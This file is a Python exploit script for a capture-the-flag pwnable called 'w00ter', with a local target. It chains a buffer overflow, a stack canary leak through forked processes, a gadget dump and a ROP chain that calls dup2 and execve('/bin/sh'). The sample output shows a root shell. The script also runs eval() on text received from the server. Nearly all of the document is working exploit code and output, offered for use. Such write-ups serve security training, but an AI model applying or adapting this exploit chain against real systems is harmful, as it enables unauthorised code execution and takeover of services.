#!/usr/bin/env python3

import socket
import struct
from time import sleep

ip="127.0.0.1"
port=1337

st = 0.2


# The w00ter challenge is a pwnable where the challenger exploits a buffer overflow, and profit weaknesses from fork(2).
# Please jump to main() to get annotations about this exploit.

# $ python pwn.py
# [+] Getting test func addr
# [!] Test func addr: 0x5612427152ce
# [+] Playing the game to set a new username
# [!] We won!
# [*] Setting new username...
# [+] Triggering buffer overflow to leak canary
# [!] RW ptr: 0x7ffd6de67420
# [!] Canary: 0x453780a17b34c100
# [+] Playing the game to set a new username
# [!] We won!
# [*] Setting new username...
# [+] Triggering BOF to execute test_func
# Gadgets addr : 0x5612427152bb
# Raw dump:
# b'\x89\xe5X^\xc3_Z[\xc3H\x89\x1f\xc3\x0f\x05\xc3\x90]\xc3'
# [*] Saved as ./bin_dump
# [*] Got required gadgets.
# [+] Playing the game to set a new username
# [!] We won!
# [*] Setting new username...
# [+] Triggering BOF to get a shell...
# id
# uid=0(root) gid=0(root) groups=0(root)



def getTestFunc():
    print("[+] Getting test func addr")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((ip,port))

    sleep(st)
    s.recv(1024)
    s.send(b"3")

    sleep(st)

    out = s.recv(1024)
    s.close()
    test_func_addr = int(out.split(b"\n")[0].split(b" ")[-1], 16)

    print(f"[!] Test func addr: {hex(test_func_addr)}")
    return test_func_addr

def setNewUsername(username):
    print(f"[+] Playing the game to set a new username")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((ip,port))

    sleep(st)
    s.recv(1024)
    s.send(b"2")

    sleep(st)
    eq = s.recv(1024).split(b" ")[0].split(b"\n")[-1].decode('utf-8')
    res = eval(eq)
    s.send(f"{res}".encode('utf-8'))

    while True:
        sleep(st)
        out =s.recv(1024)
        if (b"We have a new winer!" in out):
            print("[!] We won!")
            break
        eq = out.split(b"\n")[-2].split(b" ")[0].decode('utf-8')
        res = int(eval(eq))
        s.send(f"{res}".encode('utf-8'))


    print("[*] Setting new username...")
    sleep(st)
    s.send(username)
    sleep(st)
    s.recv(1024)
    s.close()


def getRWCanary():
    print("[+] Triggering buffer overflow to leak canary")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.connect((ip,port))

    sleep(st)
    s.recv(1024)
    s.send(b"1")

    sleep(st)
    out = s.recv(1024)
    s.close()
    with open("./fuck", "wb") as f:
        f.write(out)
    rwaddr = struct.unpack("Q", out[-7:-1] + b"\x00\x00")[0]
    canary = struct.unpack("Q", b"\x00" + out[-14:-7])[0]

    print(f"[!] RW ptr: {hex(rwaddr)}")
    print(f"[!] Canary: {hex(canary)}")
    return rwaddr,canary


def getGadgets():
    print("[+] Triggering BOF to execute test_func")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.connect((ip,port))

    s.recv(1024)
    s.send(b"1")

    sleep(st)
    out = s.recv(1024)
    s.close()

    juicy = out.split(b" ")[-1]
    gadgets_addr = int(juicy.split(b"\n")[0], 16)

    dump = juicy[15:]

    print(f"Gadgets addr : {hex(gadgets_addr)}")

    print("Raw dump: ")
    print(dump)
    with open("./bin_dump", "wb") as f:
        f.write(dump)
    print("[*] Saved as ./bin_dump")

    POP_RAX_RSI = gadgets_addr + 0x2
    POP_RDI_RDX_RBX = gadgets_addr + 0x5
    MOV_RBX_RDIADDR = gadgets_addr + 0x9
    SYSCALL = gadgets_addr + 0xd

    print("[*] Got required gadgets.")
    return gadgets_addr, POP_RAX_RSI, POP_RDI_RDX_RBX, MOV_RBX_RDIADDR, SYSCALL


def finalExploit():
    print("[+] Triggering BOF to get a shell...")
    from telnetlib import Telnet
    t=Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.connect((ip,port))

    sleep(st)
    s.recv(1024)
    s.send(b"1")

    sleep(st)
    out = s.recv(1024)
    t.sock = s
    t.interact()



def main():

    # First step is to get the address of the debug function from the 'debug' entry menu of the w00ter.
    test_func_addr = getTestFunc()

    # Now, we play the game for the first time in order to be able to set a new username. This is the first stage of the BOF. By setting a buffer of 73 bytes, we overwrite just enough bytes to get the first 7 bytes of the canary, plus an address of a RW- region
    setNewUsername(b"A" * 73)

    # Now that our malicious username is set, we just gather the loot by printing the best player in the main menu
    rwaddr,canary = getRWCanary()


    # At this point, we have the canary as well as the location of the debug function, we can therefore redirect execution to this debug function to see what it does. To do so, we create the following buffer, and replay the game to set it.
    buf = b"A"*72
    buf += struct.pack("Q", canary)
    buf += b"\x00"*8
    buf += struct.pack("Q", test_func_addr)

    setNewUsername(buf)

    # Now we trigger the BOF again to get the output of the debug function. The output gives us an address, as well as a dump of some bytes we can find there.
    # We can run ROPGadget on this dump with the following command:
    # ROPgadget --binary bin_dump --rawArch=x86 --rawMode=64
    # Which gives us the following output:
    #Gadgets information
    #============================================================
    #0x0000000000000001 : in eax, 0x58 ; pop rsi ; ret
    #0x000000000000000a : mov dword ptr [rdi], ebx ; ret
    #0x0000000000000000 : mov ebp, esp ; pop rax ; pop rsi ; ret
    #0x0000000000000009 : mov qword ptr [rdi], rbx ; ret
    #0x0000000000000010 : nop ; pop rbp ; ret
    #0x0000000000000002 : pop rax ; pop rsi ; ret
    #0x0000000000000011 : pop rbp ; ret
    #0x0000000000000007 : pop rbx ; ret
    #0x0000000000000005 : pop rdi ; pop rdx ; pop rbx ; ret
    #0x0000000000000006 : pop rdx ; pop rbx ; ret
    #0x0000000000000003 : pop rsi ; ret
    #0x0000000000000004 : ret
    #0x000000000000000d : syscall ; ret
    #
    #Unique gadgets found: 13
    #
    # We have know enough information to craft the final rop chain
    gadgets_addr, POP_RAX_RSI, POP_RDI_RDX_RBX, MOV_RBX_RDIADDR, SYSCALL = getGadgets()


    # For the final rop chain, we dup2 stdin,stdout and stderr, then we execute execve /bin/sh.
    buf = b"A"*72
    buf += struct.pack("Q", canary)
    buf += b"\x00"*8

    buf += struct.pack("Q", POP_RAX_RSI)
    buf += struct.pack("Q", 33)
    buf += struct.pack("Q", 0)
    buf += struct.pack("Q", POP_RDI_RDX_RBX)
    buf += struct.pack("Q", 4)
    buf += struct.pack("Q", 0)
    buf += struct.pack("Q", 0)
    buf += struct.pack("Q", SYSCALL)

    buf += struct.pack("Q", POP_RAX_RSI)
    buf += struct.pack("Q", 33)
    buf += struct.pack("Q", 1)
    buf += struct.pack("Q", POP_RDI_RDX_RBX)
    buf += struct.pack("Q", 4)
    buf += struct.pack("Q", 0)
    buf += struct.pack("Q", 0)
    buf += struct.pack("Q", SYSCALL)

    buf += struct.pack("Q", POP_RAX_RSI)
    buf += struct.pack("Q", 33)
    buf += struct.pack("Q", 2)
    buf += struct.pack("Q", POP_RDI_RDX_RBX)
    buf += struct.pack("Q", 4)
    buf += struct.pack("Q", 0)
    buf += struct.pack("Q", 0)
    buf += struct.pack("Q", SYSCALL)

    buf += struct.pack("Q", POP_RDI_RDX_RBX)
    buf += struct.pack("Q", rwaddr)
    buf += struct.pack("Q", 0)
    buf += b"/bin/sh\x00"
    buf += struct.pack("Q", MOV_RBX_RDIADDR)
    buf += struct.pack("Q", POP_RAX_RSI)
    buf += struct.pack("Q", 0x3b)
    buf += struct.pack("Q", 0)
    buf += struct.pack("Q", SYSCALL)

    setNewUsername(buf)

    # Now we trigger the BOF one last time, and enjoy our shell.
    finalExploit()


if __name__=='__main__':
    main()

